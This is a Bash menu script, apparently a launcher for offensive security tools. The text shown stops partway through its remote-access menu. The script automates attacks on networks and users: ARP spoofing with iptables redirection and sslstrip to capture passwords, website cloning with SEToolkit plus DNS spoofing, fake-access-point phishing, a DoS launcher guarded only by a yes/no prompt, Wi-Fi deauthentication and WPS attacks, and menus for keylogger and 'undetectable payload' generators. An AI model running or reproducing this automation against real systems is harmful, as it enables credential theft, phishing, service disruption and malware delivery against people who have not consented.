printf '\033]2;ERRORS\a'
echo -e ""$YS" 1"$CE") Fix no audio issue"
echo -e ""$YS" 2"$CE") No output in wash"
echo -e ""$YS" 3"$CE") No full screen"
echo -e ""$YS" 4"$CE") Error constructing proxy for org.gnome.Terminal"
echo -e ""$YS" 5"$CE") Error starting apache2 service"
echo -e ""$YS"back"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
echo -e " Choose: "
read ERRS
if [ "$ERRS" = "1" ]
then
	clear
	echo -e "Trying to get you some audio..."
	sleep 2
	clear
	echo -e "Press "$YS"y"$CE" if/when prompted"
	sleep 3
	clear
	echo -e "Installing pulseaudio......."
	sleep 1
	apt-get pulseaudio
	echo -e "Enabling pulseaudio......."
	sleep 1
	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
	clear
	echo -e "Done!"
	sleep 1
	clear
	echo -e "I mean...Try to see if you have audio."
	sleep 3
	echo -e " "
	echo -e "That's all i can do :/"
	sleep 2
	echo -e " "
	echo -e "If it wasn't fix , then try rebooting"
elif [ "$ERRS" = "2" ]
then
	clear
	echo -e "Ok...Lets try to fix this..."
	sleep 1
	mkdir /etc/reaver
	echo -e "It seems to be fixed."
	echo -e "Enter you interface"
	read INTWASH
	echo -e "Press "$YS"many key"$CE" to test wash"
	echo -e "Also try "wash -i wlan0mon -a" to display all networks"
	wash -i $INTWASH
elif [ "$ERRS" = "3" ]
then
	apt-get install open-vm-tools-desktop fuse
	echo -e "Restart your vistual machine..."
	sleep 2
	echo -e "$PAKTGB"
	$READAK
elif [ "$ERRS" = "4" ]
then
	locale-gen
	localectl set-locale LANG="en_US.UTF-8"
	sleep 2
	echo -e "Reboot your system now"
	sleep 3
elif [ "$ERRS" = "5" ]
then
	service nginx stop
	echo -e "I think i fixed it. Try again: service apache2 start "
	sleep 5
elif [ "$ERRS" = "back" ]
then
	BACKL="1"
	break
elif [ "$ERRS" = "0" ]
then
	clear
	echo -e "EXITING"
	sleep 1
	clear
	exit
elif [ "$ERRS" = "00" ]
then
	clear
	exec bash "$0"
else
	clear
	echo -e "Not an valid option...."
	exec bash "$0"
fi
}
function keyboard_shortcuts
{
if [ ! -d ""$KSPATH"" ]
then
	mkdir "$KSPATH"
fi
while true
do
echo -e "-----------------------"$RS"KEYBOARD SHORTCUTS"$CE"------------------------"
printf '\033]2;KEYBOARD SHORTCUTS\a'
echo -e ""$YS" 1"$CE") Tools"
echo -e ""$YS" 2"$CE") See hidden shortcuts"
echo -e ""$YS"back"$CE") Go back"
#~ echo -e ""$YS"00"$CE") Main menu"
echo -e ""$YS" 0"$CE") EXIT"
read KS
clear
if [ "$KS" = "1" ]
then
	while true
	do
	echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
	nn=1
	#start sorting out all the available shortcuts
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [ "$nn" != "$HOWADD" ]
	do
	listshortcuts
	#adding a space where needed on the output,so it will be sorted correctly
	if [ "$nn" -lt "10" ]
	then
		n=" $nn"
	else
		n="$nn"
	fi
	if [ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]
	then
		echo -e ""$YS""$n""$CE") "$TITLE""
	else
		read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		if [ "$KSKS" = "" ]
		then
			KSKS="ERROR(fix=recreate the shortcut)"
		else
			read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			size=${#TITLE}
			calc=$(( 35-size ))
			numcalc=1
			SPACES=""
			while [ $numcalc != $calc ]
			do
				SPACES=""$SPACES"_"
				numcalc=$(( numcalc+1 ))
			done
			#~ read SPACES < "$KSPATH"/spaces.txt
			echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
		fi
	fi
	nn=$(( nn+1 ))
	done
	echo -e ""$YS"back"$CE") Go back"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	#nn=""
	read nn
	clear
	listshortcuts
	if [ "$nn" = "" ]
	then
		continue
	fi
	if [ "$nn" = "back" ]
	then
		clear
		break
	elif [ "$nn" = "0" ]
	then
		clear
		exit
	elif [ "$nn" = "00" ]
	then
		exec bash "$0"
	elif [ "$nn" = "reset" ]
	then
		rm -r "$KSPATH"/*
	elif [ "$nn" -le "$HOWMANYTOOLS" ] 
	then
		createshortcut
	fi
	done
elif [ "$KS" = "2" ]
then
	hidden_shortcuts
elif [ "$KS" = "back" ]
then
	BACKL="1"
	clear
	break
elif [ "$KS" = "0" ]
then
	clear
	exit
elif [ "$KS" = "00" ]
then
	exec bash "$0"
fi
done
}
function mitm_menu
{
clear
echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
printf '\033]2;MITM\a'
echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
echo -e ""$YS"back"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
read MITMATT
clear
if [ "$MITMATT" = "1" ]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
	echo -e ""$YS" 2"$CE") Set iptables"
	echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMCH
	if [ "$MITMCH" = "1" ]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [ "$MITMCH" = "d1" ]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [ "$MITMCH" = "2" ]
	then
		clear
		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
		read PORTTCP
		if [ "$PORTTCP" = "" ]
		then
			PORTTCP="8080"
		fi
					clear
		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
		read PORTUDP
		if [ "$PORTUDP" = "" ]
		then
			PORTUDP="40"
		fi
		iptables --flush
		iptables --flush -t nat
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
		echo -e "Done."
		sleep 1
	elif [ "$MITMCH" = "3" ]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway(prefer eth0 gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
		read GATEINT
		if [ "$GATEINT" = "" ]
		then
			GATEINT="eth0"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP:"
		read TARGIP
		if [ "$TARGIP" = "r" ]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [ "$MITMCH" = "33" ]
	then
		clear
		echo -e "Enter your gateway(prefer eth0 gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
		read GATEINT
		if [ "$GATEINT" = "" ]
		then
			GATEINT="eth0"
		fi
		clear
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [ "$MITMCH" = "4" ]
	then
		leafpad /root/sslstrip.log
	#~ elif [ "$MITMCH" = "44" ]
	#~ then
	elif [ "$MITMCH" = "back" ]
	then
		clear
		break
	elif [ "$MITMCH" = "00" ]
	then
		clear
		exec bash "$0"
	elif [ "$MITMCH" = "0" ]
	then
		clear
		exit
	fi
	done
elif [ "$MITMATT" = "2" ]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
	echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
	echo -e ""$YS" 3"$CE") Start ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
	echo -e ""$YS" 4"$CE") Start SEToolkit"
	echo -e ""$YS" 5"$CE") Start DNSspoofing"
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMSET
	clear
	if [ "$MITMSET" = "1" ]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [ "$MITMSET" = "d1" ]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [ "$MITMSET" = "2" ]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		#~ if [ "$GATEINT" = "" ]
		#~ then
			#~ GATEINT="eth0"
		#~ fi
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		if [ "$TARGIP" = "r" ]
		then
			continue
		else
			break
		fi
		done
	elif [ "$MITMSET" = "22" ]
	then
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		#~ if [ "$GATEINT" = "" ]
		#~ then
			#~ GATEINT="eth0"
		#~ fi
		clear
		echo -e "Enter your target IP:"
		read TARGIP
	elif [ "$MITMSET" = "3" ]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
	#~ elif [ "$MITMSET" = "4" ]
	#~ then
		#~ service apache2 start
	#~ elif [ "$MITMSET" = "d4" ]
	#~ then
		#~ service apache2 stop
	elif [ "$MITMSET" = "4" ]
	then
		echo -e "Clone a website to one of the following IP(s):"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
	elif [ "$MITMSET" = "5" ]
	then
		echo -e "Making you a hosts.txt file"
		echo -e ""
		echo -e "Enter your IP address that you started the server:"
		echo -e "One of this/these:"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		read -e SERVIP
		echo -e "Enter the interface of that IP(e.g: wlan0):"
		read -e INTIP
		if [ -f ""$LPATH"/HOSTS/hosts.txt" ]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "Add another one as well?"$YNYES""
		read -e ANOTHERHOST
		if [ "$ANOTHERHOST" = "n" ]
		then
			break
		fi
		done
		clear
		echo -e "Starting dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
	elif [ "$MITMSET" = "back" ]
	then
		clear
		break
	elif [ "$MITMSET" = "00" ]
	then
		clear
		exec bash "$0"
	elif [ "$MITMSET" = "0" ]
	then
		clear
		exit
	fi
	done
elif [ "$MITMATT" = "back" ]
then
	BACKL="1"
	break
elif [ "$MITMATT" = "00" ]
then			
	clear
	exec bash "$0"
elif [ "$MITMATT" = "0" ]
then
	clear
	exit
fi
}
function wifi_tools
{
	while true
	do
	printf '\033]2;WIFI TOOLS\a'
	clear
	echo -e "---------------------------"$RS"WIFI TOOLS"$CE"----------------------------"
	if [ -d /root/fluxion ]
	then
		echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
	else
		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"            Multitool-Fake AP with pass confirmation"
	fi
	if [ -f /usr/bin/wifite ]
	then
		echo -e ""$YS" 2"$CE") Wifite             Multitool"
	else
		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"             Multitool"
	fi
	if [ -d /root/wifiphisher ]
	then
		echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
	else
		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"        Multitool-Fake AP etc.."
	fi
	if [ -d /root/Zatacker ]
	then
		echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"           MITM-NMAP-Mail Spammer..(Install it manually)"
	fi
	if [ -d /root/morpheus ]
	then
		echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
	else
		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"           ------------ULTIMATE MITM SUIT------------"
	fi
	if [ -d /root/osrframework ]
	then
		echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
	else
		echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"        Checks usernames-phones to platforms etc.."
	fi
	if [ -d /root/hakkuframework ]
	then
		echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
	else
		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"              Multitool-mail bomb-sniffs-cracks etc.."
	fi
	if [ -d /root/Trity ]
	then
		echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
	else
		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"              Multitool-locate ip-email bombs-brutforse etc.."
	fi
	if [ -d /root/cupp ]
	then
		echo -e ""$YS" 9"$CE") Cupp               Make specific worldlists"
	else
		echo -e ""$RS" 9"$CE") "$RS"Cupp"$CE"               Make specific worldlists"
	fi
	if [ -d /root/Dracnmap ]
	then				
		echo -e ""$YS"10"$CE") Dracnmap           Many scan options"
	else
		echo -e ""$RS"10"$CE") "$RS"Dracnmap"$CE"           Many scan options"
	fi
	if [ -d "/usr/share/fern-wifi-cracker" ]
	then	
		echo -e ""$YS"11"$CE") Fern               Wifi cracker GUI"
	else
		echo -e ""$RS"11"$CE") "$RS"Fern"$CE"               Wifi cracker GUI"
	fi
	if [ -f /usr/sbin/netdiscover ]
	then	
		echo -e ""$YS"12"$CE") Netdiscover        IPs and MACs on your net"
	else
		echo -e ""$RS"12"$CE") "$RS"Netdiscover"$CE"        IPs and MACs on your net"
	fi
	if [ -d /root/kickthemout ]
	then	
		echo -e ""$YS"13"$CE") KickThemOut        Kick clients out of your network"
	else
		echo -e ""$RS"13"$CE") "$RS"KickThemOut"$CE"        Kick clients out of your network"
	fi
	if [ -d "/usr/share/ghost-phisher" ]
	then	
		echo -e ""$YS"14"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
	else
		echo -e ""$RS"14"$CE") "$RS"Ghost-Phisher"$CE"      Fake AP,MITM,Session hijacking etc..."
	fi
	if [ -d /root/The-Eye ]
	then	
		echo -e ""$YS"15"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
	else
		echo -e ""$RS"15"$CE") "$RS"The Eye"$CE"            Detects ARP poisoning DNS spoofing etc..."
	fi
	if [ -d /root/xerxes ]
	then	
		echo -e ""$YS"16"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
	else
		echo -e ""$RS"16"$CE") "$RS"Xerxes"$CE"             The most powerful DoS tool(CAUTION)"
	fi
	#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
	if [ -d /root/mdk3-master ]
	then
		echo -e ""$YS"17"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
	else
		echo -e ""$RS"17"$CE") "$RS"Mdk3-master"$CE"        Tries to lock / reboot AP and more..."
	fi
	if [ -d /root/mdk3-master ]
	then
		echo -e ""$YS"18"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
	else
		echo -e ""$RS"18"$CE") "$RS"Mdk3-master"$CE"        Tries to reboot the AP and unlock the WPS lock"
	fi
	if [ -d /root/KatanaFramework ]
	then
		echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
	else
		echo -e ""$RS"19"$CE") "$RS"Katana Framework"$CE"   Many penetration testing features"
	fi
	if [ -d /root/airgeddon ]
	then
		echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
	else
		echo -e ""$RS"20"$CE") "$RS"Airgeddon"$CE"          Evil twin-WPA WPA2-WEP-WPS and more"
	fi
	if [ -f /usr/bin/websploit ]
	then
		echo -e ""$YS"21"$CE") Websploit          Wireless attack-multitool"
	else
		echo -e ""$RS"21"$CE") "$RS"Websploit"$CE"          Wireless attack-multitool"
	fi
	if [ -d /etc/openvas ]
	then
		echo -e ""$YS"22"$CE") Openvas            Vulnerability scanner LAN"
	else
		echo -e ""$RS"22"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
	fi
	if [ -f /usr/bin/ipscan ]
	then
		echo -e ""$YS"23"$CE") Angry IP Scanner   IP Scanner"
	else
		echo -e ""$RS"23"$CE") "$RS"Angry IP Scanner"$CE"   IP Scanner"
	fi
	if [ -d /root/routersploit ]
	then
		echo -e ""$YS"24"$CE") Routersploit       Find/exploit router vulnerabilities"
	else
		echo -e ""$RS"24"$CE") "$RS"Routersploit"$CE"       Find/exploit router vulnerabilities"
	fi
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e APPP
	clear
	if [ "$APPP" = "1" ]
	then
		if [ -d /root/fluxion ]
		then
			cd /root/fluxion
			./fluxion
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "2" ]
	then
		if [ -f /usr/bin/wifite ]
		then
			wifite
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "3" ]
	then
		if [ -d /root/wifiphisher ]
		then
			echo -e "Do you have 1 or 2 wireless interfaces?: "
			read ONEORTWO
			if [ "$ONEORTWO" = "1" ]
			then
				clear
				echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
				sleep 1
				echo -e ""
				echo -e "$PAKTC"
				$READAK
				clear
				wifiphisher -nJ
			else
				clear
				wifiphisher
			fi
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "d3" ]
	then
		if [ -d /root/wifiphisher ]
		then
			clear
			echo -e "Enter the name of the access point you want to create: "
			read -e ESSIDAP
			wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "4" ]
	then
		if [ -d /root/Zatacker ]
		then
			if [ -d "/root/Zatacker" ]
			then	
				cd /root/Zatacker
				./ZT.sh
				cd
			else
				echo -e "You have to install it manually since its not on github.Sorry."
				sleep 4
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "5" ]
	then
		if [ -d /root/morpheus ]
		then
			cd /root/morpheus
			./morpheus.sh
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "7" ] 
	then
		if [ -d /root/hakkuframework ]
		then
			echo -e "type: 'show modules' to start"
			sleep 2
			clear
			cd /root/hakkuframework
			./hakku
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "8" ]
	then
		if [ -d /root/Trity ]
		then
			echo -e "type: 'help' to start"
			sleep 2
			clear
			trity			
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "9" ]
	then
		if [ -d "/root/cupp" ]
		then
				cd /root/cupp
			python cupp.py -i
			cd			
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "10" ]
	then
		if [ -d "/root/Dracnmap" ]
		then
			cd /root/Dracnmap/
			./dracnmap-v*.sh	
			cd		
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "11" ]
	then
		if [ -d "/usr/share/fern-wifi-cracker" ]
		then
			cd /root/Fern-Wifi-Cracker
			python execute.py
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "12" ]
	then
		if [ -f /usr/sbin/netdiscover ]
		then
			echo -e "Range ("$YS"Enter"$CE"=192.168.1.0/24):"
			read NRANGE
			if [[ -z $NRANGE ]]
			then
				NRANGE="192.168.1.0/24"
			fi
			netdiscover -r $NRANGE
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "13" ]
	then
		if [ -d "/root/kickthemout" ]
		then
			cd /root/kickthemout
			python kickthemout.py
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "14" ]
	then
		if [ -d "/usr/share/ghost-phisher" ]
		then	
			cd /root/ghost-phisher/Ghost-Phisher
			python ghost.py
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "15" ]
	then
		if [ -d "/root/The-Eye" ]
		then
			cd /root/The-Eye
			./TheEye
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "16" ]
	then
		if [ -d "/root/xerxes" ]
		then
			echo -e "Do you own the site you want to DoS?"$YNONLY""
			read DOSTERM
			if [ "$DOSTERM" = "y" ]
			then

				clear
				echo -e "Enter your site(e.g: iownthissite.com): "
				echo -e "(without www)"
				read -e SITEDOS
				clear
				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
				sleep 4
				xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
				clear	
				cd /root/xerxes
				SITEDOSX=www.$SITEDOS
				echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
				$READAK
				./xerxes $SITEDOSX 80
			else
				clear
				echo -e "Then never try this."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "17" ]
	then
		if [ -d /root/mdk3-master ]
		then
			echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
			echo -e "Press "$YS"any key"$CE" to start scanning."
			$READAK
			airodump-ng $WLANNM
			echo -e "Enter your target's BSSID: "
			read -e MDBSSID
			echo -e "Enter your target's channel: "
			read -e MDCHANN
			echo -e "Enter frames per second(e.g: 50): "
			read -e FPS
			clear
			xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'	
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi	
	elif [ "$APPP" = "18" ]
	then	
		if [ -d /root/mdk3-master ]
		then
			echo -e "Press "$YS"any key"$CE" to start scanning with wash."
			$READAK
			gnome-terminal -e 'wash -i $WLANNM'
			echo -e "Enter your target's BSSID: "
			read -e MDBSSID
			echo -e "Enter your target's ESSID: "
			read -e MDESSID
			#~ echo -e "Enter your target's channel: "
			#~ read -e MDCHANN
			echo -e "Enter frames per second(e.g: 50): "
			read -e FPS
			clear
			xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "19" ]
	then
		if [ -d "/usr/share/KatanaFramework" ]
		then
			ktf.console
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "20" ]
	then
		if [ -d "/root/airgeddon" ]
		then
			cd /root/airgeddon
			./airgeddon.sh
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "21" ]
	then
		if [ -d "/usr/share/websploit" ]
		then
			websploit
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "22" ]
	then
		if [ -d /etc/openvas ]
		then
			echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
			read -e SORS
			if [ "$SORS" == "start" ]
			then
				netstat -nltp
				openvas-start
				echo -e "Launching firefox..."
				sleep 1
				firefox https://127.0.0.1:9392
			else
				openvas-stop
			fi
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "23" ]
	then
		if [ -d "/usr/lib/ipscan" ]
		then
			bash /usr/bin/ipscan & disown
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "24" ]
	then
		if [ -d "/root/routersploit" ]
		then
			cd /root/routersploit
			./rsf.py
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "6" ]
	then
		if [ -d "/root/hakkuframework" ]
		then
			while true
			do
			printf '\033]2;OSRFCONSOLE\a'
			clear
			echo -e ""$YS" 1"$CE") usufy"
			echo -e ""$YS" 2"$CE") mailfy"
			echo -e ""$YS" 3"$CE") searchfy"
			echo -e ""$YS" 4"$CE") domainfy"
			echo -e ""$YS" 5"$CE") phonefy"
			echo -e ""$YS" 6"$CE") entify"
			echo -e ""$YS"back"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
		#	echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e OSFR
			clear
				if [ "$OSFR" = "1" ]
				then
					echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
					usufy.py
					exit
				elif [ "$OSFR" = "2" ]
				then
					echo -e "Use: mailfy.py -n name1"
					mailfy.py
					exit
				elif [ "$OSFR" = "3" ]
				then
					searchfy.py
					exit
				elif [ "$OSFR" = "4" ]
				then
					domainfy.py
					exit
				elif [ "$OSFR" = "5" ]
				then
					phonefy.py
					exit
				elif [ "$OSFR" = "6" ]
				then
				entify.py
					exit
				elif [ "$OSFR" = "0" ]
				then
					exit
				elif [ "$OSFR" = "00" ]
				then
					exec bash "$0"
				elif [ "$OSFR" = "back" ]
				then
					break
				else 
					echo -e "Wrong choice"
					sleep 0.3
					clear
					exec bash "$0"
				fi
			done
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$APPP" = "0" ]
	then
		clear
		exit
	elif [ "$APPP" = "00" ]
	then
		clear
		exec bash "$0"
	elif [ "$APPP" = "back" ]
	then
		break
	fi
	done
}
function remote_access
{
	while true 
	do
	clear
	echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
	printf '\033]2;REMOTE ACCESS\a'
	if [ -d /root/BeeLogger ]
	then
		echo -e ""$YS" 1"$CE") BeeLogger    Generate keylogger"
	else
		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"    Generate keylogger"
	fi
	if [ -d /root/ezsploit ]
	then
		echo -e ""$YS" 2"$CE") Ezsploit     Generate payloads for many platforms,listeners etc..."
	else
		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"     Generate payloads for many platforms,listeners etc..."
	fi
	if [ -d /root/pupy ]
	then
		echo -e ""$YS" 3"$CE") Pupy         Generate payloads for many platforms,listeners etc..."
	else
		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"         Generate payloads for many platforms,listeners etc..."
	fi
	if [ -d /root/zirikatu ]
	then
		echo -e ""$YS" 4"$CE") Zirikatu     Generate undetectable payloads"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"     Generate undetectable payloads"
	fi
	if [ -d /root/TheFatRat ]
	then
		echo -e ""$YS" 5"$CE") TheFatRat    Generate undetectable payloads"
	else
		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"    Generate undetectable payloads"
	fi
	if [ -d /root/Winpayloads ]
	then
		echo -e ""$YS" 6"$CE") Winpayloads  Generate undetectable payloads"
	else
		echo -e ""$RS" 6"$CE") "$RS"Winpayloads"$CE"  Generate undetectable payloads"
	fi
	if [ -f /usr/bin/shellter ]
	then
		echo -e ""$YS" 7"$CE") Shellter     Inject payload into .exe"
	else
		echo -e ""$RS" 7"$CE") "$RS"Shellter"$CE"     Inject payload into .exe"
	fi
	if [ -d /root/CHAOS ]
	then
		echo -e ""$YS" 8"$CE") CHAOS        Generate payloads/listeners"
	else
